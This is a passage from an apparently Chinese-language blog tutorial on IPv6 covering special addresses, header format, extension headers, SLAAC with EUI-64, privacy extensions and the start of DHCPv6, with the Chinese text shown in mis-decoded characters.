è¯·æ±‚èŠ‚ç‚¹å¤šæ’­åœ°å€<br></code></pre></td></tr></table></figure><p><strong>IPv6æ²¡æœ‰å¹¿æ’­</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPv6å–æ¶ˆäº†å¹¿æ’­<br><br>åŸå› ï¼š<br><span class="hljs-bullet">- </span>å¹¿æ’­æ•ˆç‡ä½<br><span class="hljs-bullet">- </span>å ç”¨å¸¦å®½<br><span class="hljs-bullet">- </span>å½±å“æ‰€æœ‰èŠ‚ç‚¹<br><br>æ›¿ä»£æ–¹æ¡ˆï¼š<br>ä½¿ç”¨å¤šæ’­<br>æ›´ç²¾ç¡®ï¼Œæ›´é«˜æ•ˆ<br></code></pre></td></tr></table></figure><h3 id="2-4-ç‰¹æ®Šåœ°å€"><a href="#2-4-ç‰¹æ®Šåœ°å€" class="headerlink" title="2.4 ç‰¹æ®Šåœ°å€"></a>2.4 ç‰¹æ®Šåœ°å€</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">::1/128<br><span class="hljs-bullet">- </span>ç¯å›åœ°å€<br><span class="hljs-bullet">- </span>æœ¬åœ°ä¸»æœº<br><br>::/128<br><span class="hljs-bullet">- </span>æœªæŒ‡å®šåœ°å€<br><span class="hljs-bullet">- </span>æ²¡æœ‰åœ°å€æ—¶ä½¿ç”¨<br><br>fe80::/10<br><span class="hljs-bullet">- </span>é“¾è·¯æœ¬åœ°åœ°å€<br><span class="hljs-bullet">- </span>è‡ªåŠ¨é…ç½®<br><br>ff00::/8<br><span class="hljs-bullet">- </span>å¤šæ’­åœ°å€<br><br>2001:db8::/32<br><span class="hljs-bullet">- </span>æ–‡æ¡£åœ°å€<br><span class="hljs-bullet">- </span>ä»…ç”¨äºæ–‡æ¡£å’Œç¤ºä¾‹<br><span class="hljs-bullet">- </span>ä¸èƒ½åœ¨äº’è”ç½‘è·¯ç”±<br><br><span class="hljs-meta">::ffff:0:0/96</span><br><span class="hljs-bullet">- </span>IPv4æ˜ å°„åœ°å€<br><span class="hljs-bullet">- </span>è¡¨ç¤ºIPv4åœ°å€<br><br>64:ff9b::/96<br><span class="hljs-bullet">- </span>IPv4/IPv6è½¬æ¢<br><span class="hljs-bullet">- </span>NAT64ä½¿ç”¨<br></code></pre></td></tr></table></figure><hr><h2 id="3-IPv6æŠ¥æ–‡æ ¼å¼"><a href="#3-IPv6æŠ¥æ–‡æ ¼å¼" class="headerlink" title="3. IPv6æŠ¥æ–‡æ ¼å¼"></a>3. IPv6æŠ¥æ–‡æ ¼å¼</h2><h3 id="3-1-IPv6åŸºæœ¬å¤´éƒ¨"><a href="#3-1-IPv6åŸºæœ¬å¤´éƒ¨" class="headerlink" title="3.1 IPv6åŸºæœ¬å¤´éƒ¨"></a>3.1 IPv6åŸºæœ¬å¤´éƒ¨</h3><p><strong>å›ºå®š40å­—èŠ‚å¤´éƒ¨</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|Version| Traffic Class |           Flow Label                  |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|         Payload Length        |  Next Header  |   Hop Limit   |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                                                               |<br><span class="hljs-code">+                                                               +</span><br>|                                                               |<br><span class="hljs-code">+                         Source Address                        +</span><br>|                                                               |<br><span class="hljs-code">+                                                               +</span><br><span class="hljs-section">|                                                               |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                                                               |<br><span class="hljs-code">+                                                               +</span><br>|                                                               |<br><span class="hljs-code">+                      Destination Address                      +</span><br>|                                                               |<br><span class="hljs-code">+                                                               +</span><br><span class="hljs-section">|                                                               |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></code></pre></td></tr></table></figure><p><strong>å­—æ®µè¯´æ˜</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Versionï¼ˆç‰ˆæœ¬ï¼Œ4ä½ï¼‰ï¼š<br><span class="hljs-bullet">-</span> å€¼ä¸º6<br><br>Traffic Classï¼ˆæµé‡ç±»åˆ«ï¼Œ8ä½ï¼‰ï¼š<br><span class="hljs-bullet">-</span> ç›¸å½“äºIPv4çš„ToS<br><span class="hljs-bullet">-</span> ç”¨äºQoS<br><br>Flow Labelï¼ˆæµæ ‡ç­¾ï¼Œ20ä½ï¼‰ï¼š<br><span class="hljs-bullet">-</span> æ ‡è¯†ä¸€ä¸ªæµ<br><span class="hljs-bullet">-</span> ç”¨äºQoSä¿è¯<br><span class="hljs-bullet">-</span> åŒä¸€æµçš„åŒ…æœ‰ç›¸åŒæ ‡ç­¾<br><br>Payload Lengthï¼ˆæœ‰æ•ˆè½½è·é•¿åº¦ï¼Œ16ä½ï¼‰ï¼š<br><span class="hljs-bullet">-</span> è½½è·ï¼ˆæ•°æ®+æ‰©å±•å¤´éƒ¨ï¼‰çš„é•¿åº¦<br><span class="hljs-bullet">-</span> å•ä½ï¼šå­—èŠ‚<br><span class="hljs-bullet">-</span> ä¸åŒ…æ‹¬åŸºæœ¬å¤´éƒ¨çš„40å­—èŠ‚<br><br>Next Headerï¼ˆä¸‹ä¸€ä¸ªå¤´éƒ¨ï¼Œ8ä½ï¼‰ï¼š<br><span class="hljs-bullet">-</span> æŒ‡ç¤ºä¸‹ä¸€ä¸ªå¤´éƒ¨çš„ç±»å‹<br><span class="hljs-bullet">-</span> ç›¸å½“äºIPv4çš„Protocolå­—æ®µ<br><span class="hljs-bullet">-</span> å€¼ï¼š<br><span class="hljs-bullet">  -</span> 6ï¼šTCP<br><span class="hljs-bullet">  -</span> 17ï¼šUDP<br><span class="hljs-bullet">  -</span> 58ï¼šICMPv6<br><span class="hljs-bullet">  -</span> 43ï¼šè·¯ç”±æ‰©å±•å¤´éƒ¨<br><span class="hljs-bullet">  -</span> 44ï¼šåˆ†ç‰‡æ‰©å±•å¤´éƒ¨<br><span class="hljs-bullet">  -</span> ç­‰ç­‰<br><br>Hop Limitï¼ˆè·³æ•°é™åˆ¶ï¼Œ8ä½ï¼‰ï¼š<br><span class="hljs-bullet">-</span> ç›¸å½“äºIPv4çš„TTL<br><span class="hljs-bullet">-</span> æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨å‡1<br><span class="hljs-bullet">-</span> ä¸º0æ—¶ä¸¢å¼ƒ<br><br>Source Addressï¼ˆæºåœ°å€ï¼Œ128ä½ï¼‰ï¼š<br><span class="hljs-bullet">-</span> å‘é€æ–¹IPv6åœ°å€<br><br>Destination Addressï¼ˆç›®çš„åœ°å€ï¼Œ128ä½ï¼‰ï¼š<br><span class="hljs-bullet">-</span> æ¥æ”¶æ–¹IPv6åœ°å€<br></code></pre></td></tr></table></figure><h3 id="3-2-IPv6æ‰©å±•å¤´éƒ¨"><a href="#3-2-IPv6æ‰©å±•å¤´éƒ¨" class="headerlink" title="3.2 IPv6æ‰©å±•å¤´éƒ¨"></a>3.2 IPv6æ‰©å±•å¤´éƒ¨</h3><p><strong>æ‰©å±•å¤´éƒ¨é“¾</strong>ï¼š</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs lasso">IPv6çš„çµæ´»æ€§ï¼šæ‰©å±•å¤´éƒ¨<br><br>IPv6åŸºæœ¬å¤´éƒ¨ï¼ˆ<span class="hljs-number">40</span>å­—èŠ‚ï¼‰<br>    â†“ Next <span class="hljs-keyword">Header</span><br>æ‰©å±•å¤´éƒ¨<span class="hljs-number">1</span>ï¼ˆå¯é€‰ï¼‰<br>    â†“ Next <span class="hljs-keyword">Header</span><br>æ‰©å±•å¤´éƒ¨<span class="hljs-number">2</span>ï¼ˆå¯é€‰ï¼‰<br>    â†“ Next <span class="hljs-keyword">Header</span><br><span class="hljs-params">...</span><br>    â†“ Next <span class="hljs-keyword">Header</span><br>ä¸Šå±‚åè®®ï¼ˆTCP/UDPç­‰ï¼‰<br><br>ä¼˜ç‚¹ï¼š<br>âœ… åªåœ¨éœ€è¦æ—¶æ·»åŠ <br>âœ… æé«˜è·¯ç”±æ•ˆç‡ï¼ˆåŸºæœ¬å¤´éƒ¨å›ºå®šï¼‰<br>âœ… çµæ´»æ‰©å±•<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§æ‰©å±•å¤´éƒ¨</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> é€è·³é€‰é¡¹å¤´éƒ¨ï¼ˆHop-by-Hop Optionsï¼‰<br><span class="hljs-bullet">   -</span> Next Header = 0<br><span class="hljs-bullet">   -</span> æ¯ä¸ªè·¯ç”±å™¨éƒ½è¦å¤„ç†<br><br><span class="hljs-bullet">2.</span> è·¯ç”±å¤´éƒ¨ï¼ˆRouting Headerï¼‰<br><span class="hljs-bullet">   -</span> Next Header = 43<br><span class="hljs-bullet">   -</span> æŒ‡å®šè·¯ç”±è·¯å¾„<br><br><span class="hljs-bullet">3.</span> åˆ†ç‰‡å¤´éƒ¨ï¼ˆFragment Headerï¼‰<br><span class="hljs-bullet">   -</span> Next Header = 44<br><span class="hljs-bullet">   -</span> ç”¨äºåˆ†ç‰‡å’Œé‡ç»„<br><br><span class="hljs-bullet">4.</span> ç›®çš„é€‰é¡¹å¤´éƒ¨ï¼ˆDestination Optionsï¼‰<br><span class="hljs-bullet">   -</span> Next Header = 60<br><span class="hljs-bullet">   -</span> åªæœ‰ç›®çš„èŠ‚ç‚¹å¤„ç†<br><br><span class="hljs-bullet">5.</span> è®¤è¯å¤´éƒ¨ï¼ˆAuthentication Headerï¼ŒAHï¼‰<br><span class="hljs-bullet">   -</span> Next Header = 51<br><span class="hljs-bullet">   -</span> IPSecè®¤è¯<br><br><span class="hljs-bullet">6.</span> å°è£…å®‰å…¨è½½è·ï¼ˆESPï¼‰<br><span class="hljs-bullet">   -</span> Next Header = 50<br><span class="hljs-bullet">   -</span> IPSecåŠ å¯†<br><br>æ¨èé¡ºåºï¼š<br>åŸºæœ¬å¤´éƒ¨ â†’ é€è·³ â†’ ç›®çš„ â†’ è·¯ç”± â†’ åˆ†ç‰‡ â†’ è®¤è¯ â†’ ESP â†’ ç›®çš„ â†’ ä¸Šå±‚åè®®<br></code></pre></td></tr></table></figure><h3 id="3-3-IPv6-vs-IPv4æŠ¥æ–‡å¯¹æ¯”"><a href="#3-3-IPv6-vs-IPv4æŠ¥æ–‡å¯¹æ¯”" class="headerlink" title="3.3 IPv6 vs IPv4æŠ¥æ–‡å¯¹æ¯”"></a>3.3 IPv6 vs IPv4æŠ¥æ–‡å¯¹æ¯”</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs smali">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚      ç‰¹æ€§          â”‚    IPv4      â”‚    IPv6      â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ åœ°å€é•¿åº¦           â”‚   32ä½       â”‚   128ä½      â”‚<br>â”‚ å¤´éƒ¨é•¿åº¦           â”‚  20-60å­—èŠ‚   â”‚   40å­—èŠ‚     â”‚<br>â”‚ å¤´éƒ¨æ ¼å¼           â”‚   å¯å˜       â”‚   å›ºå®š       â”‚<br>â”‚ æ ¡éªŒå’Œ             â”‚    æœ‰        â”‚    æ—         â”‚<br>â”‚ åˆ†ç‰‡               â”‚ è·¯ç”±å™¨å¯åˆ†ç‰‡ â”‚ åªæœ‰æºèŠ‚ç‚¹   â”‚<br>â”‚ é€‰é¡¹               â”‚ å¤´éƒ¨å†…       â”‚  æ‰©å±•å¤´éƒ¨    â”‚<br>â”‚ å¹¿æ’­               â”‚    æ”¯æŒ      â”‚   ä¸æ”¯æŒ     â”‚<br>â”‚ å¤šæ’­               â”‚    å¯é€‰      â”‚   å†…ç½®       â”‚<br>â”‚ ä»»æ’­               â”‚   ä¸æ”¯æŒ     â”‚   æ”¯æŒ       â”‚<br>â”‚ IPSec              â”‚    å¯é€‰      â”‚   å¼ºåˆ¶       â”‚<br>â”‚ é…ç½®               â”‚ æ‰‹åŠ¨/DHCP    â”‚ è‡ªåŠ¨/DHCPv6  â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç®€åŒ–ï¼š<br>IPv6å»æ‰äº†ï¼š<br>âŒ å¤´éƒ¨æ ¡éªŒå’Œï¼ˆè®©ä¸Šå±‚åè®®å¤„ç†ï¼‰<br>âŒ é€‰é¡¹å­—æ®µï¼ˆæ”¹ç”¨æ‰©å±•å¤´éƒ¨ï¼‰<br>âŒ åˆ†ç‰‡å­—æ®µï¼ˆåªæœ‰æºèŠ‚ç‚¹åˆ†ç‰‡ï¼‰<br><br>IPv6æ·»åŠ äº†ï¼š<br>âœ… æµæ ‡ç­¾<br>âœ… æ‰©å±•å¤´éƒ¨æœºåˆ¶<br>âœ… æ›´å¤§çš„åœ°å€ç©ºé—´<br></code></pre></td></tr></table></figure><hr><h2 id="4-IPv6åœ°å€é…ç½®"><a href="#4-IPv6åœ°å€é…ç½®" class="headerlink" title="4. IPv6åœ°å€é…ç½®"></a>4. IPv6åœ°å€é…ç½®</h2><h3 id="4-1-æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®ï¼ˆSLAACï¼‰"><a href="#4-1-æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®ï¼ˆSLAACï¼‰" class="headerlink" title="4.1 æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®ï¼ˆSLAACï¼‰"></a>4.1 æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®ï¼ˆSLAACï¼‰</h3><p><strong>å·¥ä½œåŸç†</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs markdown">SLAAC = Stateless Address Autoconfiguration<br>æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®<br><br>è¿‡ç¨‹ï¼š<br><br><span class="hljs-bullet">1.</span> ç”Ÿæˆé“¾è·¯æœ¬åœ°åœ°å€<br><span class="hljs-bullet">   -</span> å‰ç¼€ï¼šfe80::/64<br><span class="hljs-bullet">   -</span> æ¥å£IDï¼šä»MACåœ°å€ç”Ÿæˆï¼ˆEUI-64ï¼‰<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼šfe80::xxxx:xxxx:xxxx:xxxx<br><br><span class="hljs-bullet">2.</span> é‡å¤åœ°å€æ£€æµ‹ï¼ˆDADï¼‰<br><span class="hljs-bullet">   -</span> å‘é€é‚»å±…è¯·æ±‚ï¼ˆNeighbor Solicitationï¼‰<br><span class="hljs-bullet">   -</span> å¦‚æœæ— å“åº”ï¼Œåœ°å€å¯ç”¨<br><br><span class="hljs-bullet">3.</span> è·¯ç”±å™¨å‘ç°<br><span class="hljs-bullet">   -</span> å‘é€è·¯ç”±å™¨è¯·æ±‚ï¼ˆRouter Solicitationï¼‰<br><span class="hljs-bullet">   -</span> æˆ–ç­‰å¾…è·¯ç”±å™¨é€šå‘Šï¼ˆRouter Advertisementï¼‰<br><br><span class="hljs-bullet">4.</span> ç”Ÿæˆå…¨å±€åœ°å€<br><span class="hljs-bullet">   -</span> ä»RAè·å–å‰ç¼€ï¼ˆå¦‚2001:db8::/64ï¼‰<br><span class="hljs-bullet">   -</span> åŠ ä¸Šæ¥å£ID<br><span class="hljs-bullet">   -</span> å¾—åˆ°å…¨å±€åœ°å€ï¼š2001:db8::xxxx:xxxx:xxxx:xxxx<br><br><span class="hljs-bullet">5.</span> å†æ¬¡DAD<br><span class="hljs-bullet">   -</span> ç¡®ä¿å…¨å±€åœ°å€å”¯ä¸€<br><br>å®Œæˆï¼å³æ’å³ç”¨ï¼Œæ— éœ€DHCP<br></code></pre></td></tr></table></figure><p><strong>EUI-64æ¥å£æ ‡è¯†ç¬¦</strong>ï¼š</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">ä»<span class="hljs-variable">MAC</span>åœ°å€ç”Ÿæˆæ¥å£<span class="hljs-variable">ID</span>ï¼š<br><br><span class="hljs-variable">MAC</span>åœ°å€ï¼ˆ<span class="hljs-number">48</span>ä½ï¼‰ï¼š<br><span class="hljs-number">00</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-variable">A</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-variable">B</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-built_in">C</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-built_in">D</span><span class="hljs-operator">:</span><span class="hljs-number">5</span><span class="hljs-built_in">E</span><br><br>æ­¥éª¤ï¼š<br><span class="hljs-number">1.</span> æ’å…¥<span class="hljs-variable">FF</span><span class="hljs-operator">:</span><span class="hljs-variable">FE</span><br>   <span class="hljs-number">00</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-variable">A</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-variable">B</span><span class="hljs-operator">:</span><span class="hljs-variable">FF</span><span class="hljs-operator">:</span><span class="hljs-variable">FE</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-built_in">C</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-built_in">D</span><span class="hljs-operator">:</span><span class="hljs-number">5</span><span class="hljs-built_in">E</span><br><br><span class="hljs-number">2.</span> åè½¬ç¬¬<span class="hljs-number">7</span>ä½ï¼ˆæœ¬åœ°<span class="hljs-operator">/</span>å…¨çƒä½ï¼‰<br>   <span class="hljs-number">00</span> <span class="hljs-operator">=</span> <span class="hljs-number">00000000</span><br>   åè½¬ç¬¬<span class="hljs-number">7</span>ä½ <span class="hljs-operator">=</span> <span class="hljs-number">00000010</span> <span class="hljs-operator">=</span> <span class="hljs-number">02</span><br><br>ç»“æœï¼š<br><span class="hljs-number">02</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-variable">A</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-variable">B</span><span class="hljs-operator">:</span><span class="hljs-variable">FF</span><span class="hljs-operator">:</span><span class="hljs-variable">FE</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-built_in">C</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-built_in">D</span><span class="hljs-operator">:</span><span class="hljs-number">5</span><span class="hljs-built_in">E</span><br><br>æ¥å£<span class="hljs-variable">ID</span>ï¼š<br><span class="hljs-number">021</span><span class="hljs-variable">a</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-variable">bff</span><span class="hljs-operator">:</span><span class="hljs-variable">fe3c</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-variable">d5e</span><br><br>å®Œæ•´åœ°å€ï¼š<br><span class="hljs-number">2001</span><span class="hljs-operator">:</span><span class="hljs-variable">db8</span><span class="hljs-operator">::</span><span class="hljs-number">021</span><span class="hljs-variable">a</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-variable">bff</span><span class="hljs-operator">:</span><span class="hljs-variable">fe3c</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-variable">d5e</span><br><br>ç®€åŒ–ï¼š<br><span class="hljs-number">2001</span><span class="hljs-operator">:</span><span class="hljs-variable">db8</span><span class="hljs-operator">::</span><span class="hljs-number">21</span><span class="hljs-variable">a</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-variable">bff</span><span class="hljs-operator">:</span><span class="hljs-variable">fe3c</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-variable">d5e</span><br></code></pre></td></tr></table></figure><p><strong>éšç§æ‰©å±•</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">é—®é¢˜ï¼š<br>EUI-64ä½¿ç”¨MACåœ°å€<br>â†’ åœ°å€åŒ…å«ç¡¬ä»¶ä¿¡æ¯<br>â†’ å¯ä»¥è·Ÿè¸ªè®¾å¤‡<br>â†’ éšç§é—®é¢˜<br><br>è§£å†³æ–¹æ¡ˆï¼š<br>éšç§æ‰©å±•ï¼ˆPrivacy Extensionsï¼ŒRFC 4941ï¼‰<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>éšæœºç”Ÿæˆæ¥å£ID<br><span class="hljs-bullet">- </span>å®šæœŸæ›´æ¢<br><span class="hljs-bullet">- </span>ä¸´æ—¶åœ°å€<br><br>ç»“æœï¼š<br>ä¸»æœºæœ‰å¤šä¸ªIPv6åœ°å€ï¼š<br><span class="hljs-bullet">- </span>é“¾è·¯æœ¬åœ°åœ°å€ï¼ˆfe80::ï¼‰<br><span class="hljs-bullet">- </span>æ°¸ä¹…å…¨å±€åœ°å€ï¼ˆåŸºäºEUI-64ï¼‰<br><span class="hljs-bullet">- </span>ä¸´æ—¶åœ°å€ï¼ˆéšç§æ‰©å±•ï¼‰<br></code></pre></td></tr></table></figure><h3 id="4-2-DHCPv6"><a href="#4-2-DHCPv6" class="headerlink" title="4.2 DHCPv6"></a>4.2 DHCPv6</h3><p><strong>æœ‰çŠ¶æ€é…ç½®</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown">DHCPv6 = ç±»ä¼¼IPv4çš„DHCP<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br><span class="hljs-bullet">-</span> éœ€è¦DNSæœåŠ¡å™¨åœ°å€<br><span class="hljs-bullet">-</span> éœ€è¦ä¸­å¤®ç®¡ç†<br><span class="hljs-bullet">-</span> éœ€è¦ç‰¹å®šåœ°å€åˆ†é…<br><br>å·¥ä½œæ¨¡å¼ï¼š<br><br><span class="hljs-bullet">1.</span> æœ‰çŠ¶æ€DHCPv6ï¼ˆStatefulï¼‰<br><span class="hljs-bullet">   -</span> åˆ†é…å®Œæ•´åœ°å€<br><span class="hljs-bullet">   -</span> ç±»ä¼¼IPv4 DHCP<br><br><span class="hljs-bullet">2.</span> æ— çŠ¶æ€DHCPv6ï¼ˆStatelessï¼‰<br><span class="hljs-bullet">   -</span> 